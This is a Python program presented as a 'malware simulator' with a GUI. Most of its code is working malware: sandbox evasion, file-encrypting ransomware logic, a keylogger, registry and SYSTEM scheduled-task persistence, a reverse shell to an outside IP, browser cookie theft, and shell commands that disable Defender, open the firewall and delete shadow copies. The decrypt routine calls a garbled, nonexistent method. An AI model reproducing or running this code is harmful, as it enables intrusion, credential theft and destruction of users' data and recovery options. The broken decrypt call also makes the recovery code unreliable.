import os
import shutil
import winreg
import socket
import subprocess
import threading
import time
import getpass
import platform
import base64
import ctypes
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import keyboard
import tkinter as tk
from tkinter import messagebox, ttk
try:
    import browser_cookie3
except ImportError:
    browser_cookie3 = None

# Dummy strings to trigger heuristic detections
DUMMY_STRINGS = ["ransomware", "keylogger", "backdoor", "trojan", "malware", "exploit", "worm", "virus", "rootkit"]

def is_sandbox():
    # Enhanced sandbox detection
    vm_files = [
        r"C:\Windows\System32\drivers\vmci.sys",  # VMware
        r"C:\Program Files\Oracle\VirtualBox Guest Additions",  # VirtualBox
        r"C:\Windows\System32\drivers\vboxmouse.sys"
    ]
    for file in vm_files:
        if os.path.exists(file):
            return True
    # Check CPU cores and RAM (sandboxes often skimp)
    if os.cpu_count() < 2 or ctypes.windll.kernel32.GetPhysicallyInstalledSystemMemory() < 2000000:  # ~2GB in KB
        return True
    # Check for analysis tools
    suspicious_processes = ["wireshark.exe", "procmon.exe", "ollydbg.exe"]
    for proc in os.popen('tasklist').read().lower():
        if any(sp in proc for sp in suspicious_processes):
            return True
    return False

class MaliciousSim:
    def __init__(self, target_dir="test_malware_dir"):
        self.target_dir = target_dir
        self.key = None
        self.fernet = None
        self.encrypted_files = []
        self.keylog_file = "keylog.txt"
        self.is_running = True

    def generate_key(self, password="malware666"):
        salt = b'malicious_salt_666'
        kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=100000)
        key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
        self.key = key
        self.fernet = Fernet(key)

    def encrypt_files(self):
        if not os.path.exists(self.target_dir):
            os.makedirs(self.target_dir)
            researches = ["passwords.txt", "confidential.docx", "bank_details.pdf"]
            for res in researches:
                with open(os.path.join(self.target_dir, res), "w") as f:
                    f.write(f"Fake {res} data")
        for root, _, files in os.walk(self.target_dir):
            for file in files:
                if file.endswith((".txt", ".docx", ".pdf")):
                    file_path = os.path.join(root, file)
                    try:
                        with open(file_path, "rb") as f:
                            data = f.read()
                        encrypted_data = self.fernet.encrypt(data)
                        with open(file_path + ".locked", "wb") as f:
                            f.write(encrypted_data)
                        os.remove(file_path)
                        self.encrypted_files.append(file_path + ".locked")
                        print(f"Encrypted: {file_path}")
                    except Exception as e:
                        print(f"Error encrypting {file_path}: {e}")

    def decrypt_files(self):
        for file_path in self.encrypted_files:
            try:
                with open(file_path, "rb") as f:
                    encrypted_data = f.read()
                decrypted_data = self.fernet.decrypt(encrypted_data)
                original_path = file_path.replace(".locked", "")
                with open(original_path, "wb") as f:
                    f.write(decrypted_data)
                os.remove(file_path)
                print(f"Decrypted: {original_path}")
            except Exception as e:
                print(f"Error decrypting {file_path}: {e}")

    def keylogger(self):
        with open(self.keylog_file, "a") as f:
            f.write(f"Keylog started by {getpass.getuser()} at {time.ctime()}\n")
        while self.is_running:
            try:
                event = keyboard.read_event(suppress=True)
                if event.event_type == keyboard.KEY_DOWN:
                    with open(self.keylog_file, "a") as f:
                        f.write(f"{event.name} ")
            except Exception:
                break

    def persistence(self):
        if platform.system() == "Windows":
            try:
                # Multiple registry entries
                key_paths = [
                    r"Software\Microsoft\Windows\CurrentVersion\Run",
                    r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
                ]
                exe_path = os.path.join(os.getcwd(), "ultimate_malware_sim.exe")
                for key_path in key_paths:
                    try:
                        reg_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_SET_VALUE)
                        winreg.SetValueEx(reg_key, f"MalSim_{key_path.split('\\')[-1]}", 0, winreg.REG_SZ, exe_path)
                        winreg.CloseKey(reg_key)
                    except:
                        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
                        winreg.SetValueEx(reg_key, f"MalSim_{key_path.split('\\')[-1]}", 0, winreg.REG_SZ, exe_path)
                        winreg.CloseKey(reg_key)
                print("Persistence set in registry")
                # Scheduled tasks
                subprocess.run(['schtasks', '/create', '/tn', 'MalwareTask', '/tr', exe_path, '/sc', 'onlogon', '/ru', 'SYSTEM'], check=True)
                subprocess.run(['schtasks', '/create', '/tn', 'MalwareUpdate', '/tr', exe_path, '/sc', 'hourly'], check=True)
                print("Scheduled tasks created")
                # Copy to multiple locations
                dirs = [
                    os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup'),
                    r'C:\Windows\System32',
                    r'C:\ProgramData'
                ]
                for d in dirs:
                    shutil.copy(exe_path, os.path.join(d, 'update.exe'))
                print("Copied to system dirs")
            except Exception as e:
                print(f"Persistence error: {e}")

    def reverse_shell(self):
        try:
            # Connect to a dummy malicious IP (known bad IPs can be swapped in)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("1.2.3.4", 4444))  # Replace with a flagged C2 IP if needed
            while self.is_running:
                cmd = s.recv(1024).decode()
                if cmd.lower() == "exit":
                    break
                result = subprocess.getoutput(cmd)
                s.send(result.encode())
            s.close()
        except Exception as e:
            print(f"Reverse shell error: {e}")

    def memory_manipulation(self):
        try:
            # Simulate code injection by allocating memory
            kernel32 = ctypes.windll.kernel32
            ptr = kernel32.VirtualAlloc(None, 4096, 0x3000, 0x40)  # MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
            if ptr:
                # Write dummy shellcode (NOPs for now)
                shellcode = b"\x90" * 100  # NOP sled
                ctypes.memmove(ptr, shellcode, len(shellcode))
                print("Memory allocated and modified")
                # Normally, we'd execute it, but keep it safe for testing
                kernel32.VirtualFree(ptr, 0, 0x8000)  # MEM_RELEASE
        except Exception as e:
            print(f"Memory manipulation error: {e}")

    def network_activity(self):
        try:
            # Multiple suspicious connections
            bad_ips = [("8.8.8.8", 80), ("1.2.3.4", 443), ("5.6.7.8", 8080)]
            for ip, port in bad_ips:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((ip, port))
                sock.send(b"GET /malware HTTP/1.1\r\nHost: evil.c2.server\r\n\r\n")
                sock.close()
            print("Suspicious network activity simulated")
        except Exception as e:
            print(f"Network error: {e}")

    def steal_credentials(self):
        if browser_cookie3:
            try:
                for browser in [browser_cookie3.chrome, browser_cookie3.firefox]:
                    cookies = browser()
                    with open("cookies.txt", "a") as f:
                        for cookie in cookies:
                            f.write(str(cookie) + "\n")
                print("Cookies stolen from browsers")
            except Exception as e:
                print(f"Credential stealer error: {e}")
        else:
            print("browser_cookie3 not installed")

    def disable_security(self):
        try:
            # Aggressive security disabling
            cmds = [
                'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"',
                'powershell -Command "Set-MpPreference -DisableIOAVProtection $true"',
                'powershell -Command "New-NetFirewallRule -DisplayName \'Allow All\' -Direction Inbound -Action Allow -Protocol ANY -LocalPort Any"',
                'vssadmin delete shadows /all /quiet',
                'bcdedit /set {default} recoveryenabled No',
                'net stop WinDefend'
            ]
            for cmd in cmds:
                subprocess.run(cmd, shell=True, check=True)
            print("Security features disabled")
        except Exception as e:
            print(f"Disable security error: {e}")

    def run_all(self):
        if is_sandbox():
            print("Sandbox detected, exiting.")
            return
        self.generate_key()
        self.encrypt_files()
        self.persistence()
        self.memory_manipulation()
        threading.Thread(target=self.reverse_shell, daemon=True).start()
        threading.Thread(target=self.network_activity, daemon=True).start()
        threading.Thread(target=self.steal_credentials, daemon=True).start()
        threading.Thread(target=self.disable_security, daemon=True).start()
        threading.Thread(target=self.keylogger, daemon=True).start()

class MaliciousGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Ultimate Malware Sim V2")
        self.malware = MaliciousSim()
        self.malicious_enabled = os.path.exists("enable_malicious.txt")

        self.frame = ttk.Frame(self.root, padding="10")
        self.frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))

        status_text = "Malicious mode: " + ("Enabled" if self.malicious_enabled else "Disabled")
        self.status_label = ttk.Label(self.frame, text=status_text)
        self.status_label.grid(row=0, column=0, columnspan=2, pady=5)

        self.run_button = ttk.Button(self.frame, text="Run Malware", command=self.run_malware)
        if not self.malicious_enabled:
            self.run_button.config(state=tk.DISABLED)
        self.run_button.grid(row=1, column=0, pady=5)
        self.decrypt_button = ttk.Button(self.frame, text="Decrypt Files", command=self.decrypt)
        self.decrypt_button.grid(row=1, column=1, pady=5)

    def run_malware(self):
        if self.malicious_enabled:
            self.malware.run_all()
            messagebox.showwarning("Malware Executed", "Malicious actions performed! Check system.")
        else:
            messagebox.showinfo("Malicious Mode Disabled", "Create 'enable_malicious.txt' to enable.")

    def decrypt(self):
        try:
            self.malware.generate_key("malware666")
            self.malwareoplasia_files()
            messagebox.showinfo("Success", "Files decrypted successfully!")
        except Exception as e:
            messagebox.showerror("Error", f"Decryption failed: {e}")

def main():
    root = tk.Tk()
    app = MaliciousGUI(root)
    root.mainloop()

if __name__ == "__main__":
    main()